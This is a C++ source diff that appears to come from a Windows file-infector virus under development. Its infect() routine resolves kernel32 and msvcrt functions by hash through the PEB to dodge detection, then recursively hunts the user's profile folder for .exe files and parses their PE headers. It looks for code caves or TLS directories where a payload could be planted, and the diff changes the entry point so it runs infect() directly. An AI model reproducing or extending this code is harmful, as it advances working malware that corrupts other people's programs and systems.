@@ -113,36 +113,12 @@ int infect(void)
 #endif
 
    PFULL_PEB_LDR_DATA ldr = reinterpret_cast<PFULL_PEB_LDR_DATA>(peb->Ldr);
-   PLIST_ENTRY list_entry = ldr->InLoadOrderModuleList.Flink;
-   PFULL_LDR_DATA_TABLE_ENTRY kernel32 = nullptr;
-
-   while (list_entry != nullptr)
-   {
-      PFULL_LDR_DATA_TABLE_ENTRY table_entry = reinterpret_cast<PFULL_LDR_DATA_TABLE_ENTRY>(list_entry);
-
-      if (table_entry->BaseDllName.Buffer == nullptr)
-      {
-         list_entry = nullptr;
-         continue;
-      }
-
-      if (*reinterpret_cast<std::uint64_t *>(table_entry->BaseDllName.Buffer) == 0x4e00520045004b) // L"KERN"
-      {
-         kernel32 = table_entry;
-         break;
-      }
-      
-      list_entry = table_entry->InLoadOrderLinks.Flink;
-   }
-
-   if (kernel32 == nullptr)
-      return 1;
-
+   PFULL_LDR_DATA_TABLE_ENTRY list_entry = reinterpret_cast<PFULL_LDR_DATA_TABLE_ENTRY>(ldr->InLoadOrderModuleList.Flink);
+   PFULL_LDR_DATA_TABLE_ENTRY kernel32 = reinterpret_cast<PFULL_LDR_DATA_TABLE_ENTRY>(reinterpret_cast<PFULL_LDR_DATA_TABLE_ENTRY>(list_entry->InLoadOrderLinks.Flink)->InLoadOrderLinks.Flink);
    LoadLibraryAHeader loadLibrary = reinterpret_cast<LoadLibraryAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0x53b2070f));
    FindFirstFileAHeader findFirstFile = reinterpret_cast<FindFirstFileAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0xd7482f55));
    FindNextFileAHeader findNextFile = reinterpret_cast<FindNextFileAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0x6f4d1398));
-   char msvcrtDll[] = {'m','s','v','c','r','t','.','d','l','l',0};
-   PIMAGE_DOS_HEADER msvcrtModule = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary(msvcrtDll));
+   PIMAGE_DOS_HEADER msvcrtModule = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary("msvcrt.dll"));
    mallocHeader malloc = reinterpret_cast<mallocHeader>(get_proc_by_hash(msvcrtModule, 0x558c274d));
    reallocHeader realloc = reinterpret_cast<reallocHeader>(get_proc_by_hash(msvcrtModule, 0xbf26b345));
    freeHeader free = reinterpret_cast<freeHeader>(get_proc_by_hash(msvcrtModule, 0x99b3eedb));
@@ -150,16 +126,15 @@ int infect(void)
    strnicmpHeader strnicmp = reinterpret_cast<strnicmpHeader>(get_proc_by_hash(msvcrtModule, 0x3b2c5b30));
    strlenHeader strlen = reinterpret_cast<strlenHeader>(get_proc_by_hash(msvcrtModule, 0x58ba3d97));
    memcpyHeader memcpy = reinterpret_cast<memcpyHeader>(get_proc_by_hash(msvcrtModule, 0xa45cec64));
-   char shell32Dll[] = {'s','h','e','l','l','3','2','.','d','l','l',0};
-   PIMAGE_DOS_HEADER shell32Module = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary(shell32Dll));
+   PIMAGE_DOS_HEADER shell32Module = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary("shell32.dll"));
    SHGetFolderPathAHeader getFolderPath = reinterpret_cast<SHGetFolderPathAHeader>(get_proc_by_hash(shell32Module, 0xe8692330));
    
-   char *profile_directory = reinterpret_cast<char *>(malloc(MAX_PATH+1));
+   char profile_directory[MAX_PATH+1];
 
    if (getFolderPath(nullptr, CSIDL_PROFILE, nullptr, 0, profile_directory) != 0)
       return 2;
 
-   char prepend_path[] = {'\\', '\\', '?', '\\', 0};
+   char prepend_path[] = "\\\\?\\";
    std::size_t root_size = strlen(prepend_path)+strlen(profile_directory)+1;
    char *search_root = reinterpret_cast<char *>(malloc(root_size));
    memcpy(search_root, prepend_path, strlen(prepend_path)+1);
@@ -176,8 +151,8 @@ int infect(void)
    while (search_stack_size > 0)
    {
       char *search_visit = search_stack[0];
-      char starSearch[] = {'\\','*',0};
-      char exeSearch[] = {'.','e','x','e',0};
+      char starSearch[] = "\\*";
+      char exeSearch[] = ".exe";
       --search_stack_size;
 
       if (search_stack_size == 0)
@@ -203,14 +178,14 @@ int infect(void)
 
       do
       {
-         char slash[] = {'\\',0};
-         char dot[] = {'.', 0};
-         char dotDot[] = {'.', '.', 0};
+         char slash[] = "\\";
+         char dot[] = ".";
+         char dotDot[] = "..";
 
          if (strnicmp(find_data.cFileName, dot, 2) == 0 || strnicmp(find_data.cFileName, dotDot, 3) == 0)
             continue;
          else if ((find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0x10 &&
-                  (find_data.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) != 0x400)
+                  (find_data.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) != 0x400) // if directory and not symlink
          {
             char *new_directory = reinterpret_cast<char *>(malloc(strlen(search_visit)+strlen(slash)+strlen(find_data.cFileName)+1));
             memcpy(new_directory, search_visit, strlen(search_visit)+1);
@@ -286,43 +261,25 @@ int infect(void)
       }
 
       IMAGE_DOS_HEADER *dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(exe_buffer);
-      IMAGE_NT_HEADERS32 *nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS32>(exe_buffer+dos_header->e_lfanew);
-      std::size_t nt_headers_size = sizeof(DWORD)+sizeof(IMAGE_FILE_HEADER)+nt_headers->FileHeader.SizeOfOptionalHeader;
-      IMAGE_SECTION_HEADER *section_table = reinterpret_cast<PIMAGE_SECTION_HEADER>(exe_buffer+dos_header->e_lfanew+nt_headers_size);
+      IMAGE_NT_HEADERS *nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS32>(exe_buffer+dos_header->e_lfanew);
 
-      std::wcout << "\tScanning " << executable << "..." << std::endl;
-
-      for (std::size_t i=0; i<nt_headers->FileHeader.NumberOfSections; ++i)
+      if (nt_headers->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
       {
-         IMAGE_SECTION_HEADER *section = &section_table[i];
-
-         if ((section->Characteristics & IMAGE_SCN_MEM_EXECUTE) != IMAGE_SCN_MEM_EXECUTE)
-            continue;
-
-         std::uint8_t *section_end = exe_buffer+section->PointerToRawData+section->SizeOfRawData;
-         std::uint8_t *cave_begin = section_end-1;
-
-         while (*cave_begin == 0)
-            --cave_begin;
-         
-         std::wcout << "\t\tFound code section " << reinterpret_cast<char *>(&section->Name) << " with cave size " << static_cast<std::uintptr_t>(section_end - cave_begin) << std::endl;
+         std::wcout << "\tExecutable " << executable << " is not a 64-bit image." << std::endl;
+         goto free_file;
       }
-      
-      /*
-      if (nt_headers->OptionalHeader.Machine == IMAGE_NT_OPTIONAL_HDR64_MAGIC)
+
+      if (nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress == 0)
       {
-         /* drop 64-bit payload 
+         std::wcout << "\tExecutable " << executable << " does not have a TLS directory." << std::endl;
       }
       else
       {
-         /* drop 32-bit payload
+         std::wcout << "\tExecutable " << executable << " has a TLS directory." << std::endl;
       }
-      */
-      
-      /* check to see if it's a 32-bit PE file or a 64-bit PE file and create pointers as necessary
-         check the section table for executable sections
-         determine the size of the code caves, if any
-      */
+
+      std::size_t nt_headers_size = sizeof(DWORD)+sizeof(IMAGE_FILE_HEADER)+nt_headers->FileHeader.SizeOfOptionalHeader;
+      IMAGE_SECTION_HEADER *section_table = reinterpret_cast<PIMAGE_SECTION_HEADER>(exe_buffer+dos_header->e_lfanew+nt_headers_size);
 
    free_file:
       free(exe_buffer);
@@ -336,7 +293,6 @@ int infect(void)
    }
 
    free(found_executables);
-   free(profile_directory);
 
    return 0;
 }
@@ -391,5 +347,5 @@ resume_executable:
 int wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow)
 {
    //infect();
-   return callout();
+   return infect();
 }
